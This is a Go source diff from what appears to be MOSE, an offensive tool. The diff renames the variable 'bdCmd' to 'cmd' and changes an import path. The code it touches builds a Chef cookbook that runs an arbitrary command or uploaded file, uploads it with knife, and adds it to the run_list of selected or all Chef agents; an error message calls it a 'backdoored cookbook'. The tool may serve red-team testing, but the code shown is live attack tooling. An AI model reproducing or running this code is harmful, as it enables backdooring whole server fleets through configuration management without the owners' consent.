@@ -25,7 +25,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/gobuffalo/packr/v2"
 	utils "github.com/l50/goutils"
-	"github.com/master-of-servers/mose/pkg/moseutils"
+	"github.com/l50/MOSE/pkg/moseutils"
 )
 
 type Command struct {
@@ -41,7 +41,7 @@ type Metadata struct {
 
 var (
 	a                = CreateAgent()
-	bdCmd            = a.BdCmd
+	cmd              = a.Cmd
 	errmsg           = color.Red
 	localIP          = a.LocalIP
 	msg              = color.Green
@@ -54,7 +54,7 @@ var (
 	keys             []string
 	inspect          bool
 	suppliedNodes    string
-	uploadFilePath   = a.FilePath
+	uploadFilePath   = a.RemoteUploadFilePath
 	cleanup          bool
 	cleanupFile      = a.CleanupFile
 )
@@ -140,7 +140,7 @@ func createMetadata(absCookbookPath string) bool {
 func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
 	chefCommand := Command{
 		CmdName:  cookbookName,
-		Cmd:      bdCmd,
+		Cmd:      cmd,
 		FileName: uploadFileName,
 		FilePath: uploadFilePath,
 	}
@@ -407,13 +407,13 @@ func chefWorkstation(knifeFile string, chefDirs []string) {
 			if uploadFileName != "" {
 				msg("Creating cookbook to run file %s on the following Chef agents: %v, please wait...", uploadFileName, nodes)
 			} else {
-				msg("Creating cookbook to run %s on the following Chef agents: %v, please wait...", bdCmd, nodes)
+				msg("Creating cookbook to run %s on the following Chef agents: %v, please wait...", cmd, nodes)
 			}
 		} else {
 			if uploadFileName != "" {
 				msg("Creating cookbook to run file %s on all Chef agents, please wait...", uploadFileName)
 			} else {
-				msg("Creating cookbook to run %s on all Chef agents, please wait...", bdCmd)
+				msg("Creating cookbook to run %s on all Chef agents, please wait...", cmd)
 			}
 		}
 		var cookbooksLoc string
@@ -422,10 +422,10 @@ func chefWorkstation(knifeFile string, chefDirs []string) {
 				cookbooksLoc = dir
 			}
 		}
-		createCookbook(cookbooksLoc, cookbookName, bdCmd)
+		createCookbook(cookbooksLoc, cookbookName, cmd)
 		log.Println("Moving to the recipes dir in order to upload the cookbook.")
 		moseutils.Cd(cookbooksLoc)
-		msg("Uploading the %s cookbook to the chef server, please wait...", bdCmd)
+		msg("Uploading the %s cookbook to the chef server, please wait...", cmd)
 		_, err = runKnifeCmd(utils.RunCommand(knifeFile, "upload", cookbookName))
 		if err != nil {
 			log.Fatalf("Error while trying to upload backdoored cookbook: %s using the following command: %v", err, knifeFile+" upload "+cookbookName)
@@ -436,13 +436,13 @@ func chefWorkstation(knifeFile string, chefDirs []string) {
 			if uploadFileName != "" {
 				msg("Adding cookbook to run file %s to run_list for the following Chef agents: %v, please wait...", uploadFileName, nodes)
 			} else {
-				msg("Adding %s cookbook to run_list for the following Chef agents: %v, please wait...", bdCmd, nodes)
+				msg("Adding %s cookbook to run_list for the following Chef agents: %v, please wait...", cmd, nodes)
 			}
 		} else {
 			if uploadFileName != "" {
 				msg("Adding cookbook with file %s upload to run_list for all Chef agents, please wait...", uploadFileName)
 			} else {
-				msg("Adding %s cookbook to run_list for all Chef agents, please wait...", bdCmd)
+				msg("Adding %s cookbook to run_list for all Chef agents, please wait...", cmd)
 			}
 		}
 		setRunLists(nodes, knifeFile)
